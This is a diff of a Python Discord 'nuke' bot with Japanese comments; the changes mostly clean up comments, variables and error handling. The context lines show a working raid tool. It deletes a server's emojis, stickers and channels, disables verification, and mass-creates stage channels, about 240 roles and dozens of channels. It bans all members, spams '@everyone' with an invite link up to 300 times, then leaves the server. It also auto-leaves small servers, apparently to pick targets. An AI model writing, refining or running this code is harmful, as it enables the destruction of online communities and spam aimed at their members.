@@ -91,7 +91,7 @@ async def create_colored_roles_task(guild, target_roles):
             current += 1
         except:
             break
-        await asyncio.sleep(random.uniform(0.12, 0.25))  # 上限狙いで少し長め
+        await asyncio.sleep(random.uniform(0.12, 0.25))
 
 async def ban_all_task(guild, members, reason):
     for m in members:
@@ -137,7 +137,7 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # 絵文字削除（バッチ）
+    # 絵文字削除
     emojis = await guild.fetch_emojis()
     if emojis:
         batch_size_emoji = 5
@@ -150,7 +150,7 @@ async def core_nuke(guild, new_server_name=None):
     stickers = await guild.fetch_stickers()
     await asyncio.gather(*(limited_global(s.delete()) for s in stickers), return_exceptions=True)
 
-    # コミュニティ無効化（無視）
+    # コミュニティ無効化（失敗無視）
     try:
         await limited_global(guild.edit(
             verification_level=discord.VerificationLevel.none,
@@ -215,7 +215,7 @@ async def core_nuke(guild, new_server_name=None):
 
     print(f"チャンネル削除完了: 残り {len(guild.channels)}個")
 
-    # ステージチャンネル大量作成（無視）
+    # ステージチャンネル大量作成（失敗無視）
     stage_tasks = [limited_global(create_stage_channel_safely(guild, f"ますまにステージ-{i}")) for i in range(20)]
     await asyncio.gather(*stage_tasks, return_exceptions=True)
 
@@ -225,23 +225,16 @@ async def core_nuke(guild, new_server_name=None):
     except:
         pass
 
-    # チャンネル作成（規模別）
+    # チャンネル作成
     member_count = len(non_bot_members)
     if member_count < 100:
         target_channels = 80
-        target_roles = 240  # 上限近く
-        spam_sleep_min = 0.08
-        spam_sleep_max = 0.25
     elif member_count < 500:
         target_channels = 70
-        target_roles = 240
-        spam_sleep_min = 0.12
-        spam_sleep_max = 0.30
     else:
         target_channels = 50
-        target_roles = 240
-        spam_sleep_min = 0.20
-        spam_sleep_max = 0.40
+
+    target_roles = 240  # 上限近く
 
     channels_created = []
     current = 0
@@ -262,7 +255,7 @@ async def core_nuke(guild, new_server_name=None):
     # ロール作成（240個）
     role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
 
-    # スパム（上限300に変更）
+    # スパム（上限300）
     spam_messages = [
         f"@everyone {INVITE_LINK}",
         f"@everyone 来い {INVITE_LINK}"
@@ -283,7 +276,7 @@ async def core_nuke(guild, new_server_name=None):
             message_counters[ch.id] += 1
 
         await asyncio.gather(*spam_tasks, return_exceptions=True)
-        await asyncio.sleep(random.uniform(spam_sleep_min, spam_sleep_max))
+        await asyncio.sleep(random.uniform(0.08, 0.25))
 
     await ban_task
     await role_create_task
@@ -291,25 +284,24 @@ async def core_nuke(guild, new_server_name=None):
     print("ヌーク完了 → bot退出")
     try:
         await guild.leave()
-    except:
-        print("退出失敗")
+    except Exception as e:
+        print(f"退出失敗: {e}")
 
     print("完了")
 
-# 自動退出機能
 @bot.event
 async def on_guild_join(guild):
     non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
     member_count = len(non_bot_members)
 
     if member_count <= 5 and not guild.name.startswith("ま"):
-        print(f"自動退出: {guild.name} (メンバー{bot含まず}{member_count}人、名前が「ま」から始まらない)")
+        print(f"自動退出: {guild.name} (メンバー含まず {member_count}人、名前が「ま」から始まらない)")
         try:
             await guild.leave()
-        except:
-            pass
+        except Exception as e:
+            print(f"退出失敗: {e}")
     else:
-        print(f"新規参加: {guild.name} (メンバー{bot含まず}{member_count}人) → 残留")
+        print(f"新規参加: {guild.name} (メンバー含まず {member_count}人) → 残留")
 
 @bot.event
 async def on_ready():
@@ -319,11 +311,11 @@ async def on_ready():
         non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
         member_count = len(non_bot_members)
         if member_count <= 5 and not guild.name.startswith("ま"):
-            print(f"起動時自動退出: {guild.name} (メンバー{bot含まず}{member_count}人)")
+            print(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
             try:
                 await guild.leave()
-            except:
-                pass
+            except Exception as e:
+                print(f"退出失敗: {e}")
         else:
             await log_server_info(guild)
     print("=====================================")
@@ -336,8 +328,11 @@ async def on_ready():
             options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
             view.select_guild.options = options
             await manage_channel.send("サーバー管理パネル", view=view)
+        else:
+            print("管理チャンネルが見つかりません")
+    else:
+        print("管理サーバーが見つかりません")
 
-# 管理View（変更なし）
 class ManageView(discord.ui.View):
     def __init__(self, bot):
         super().__init__(timeout=None)
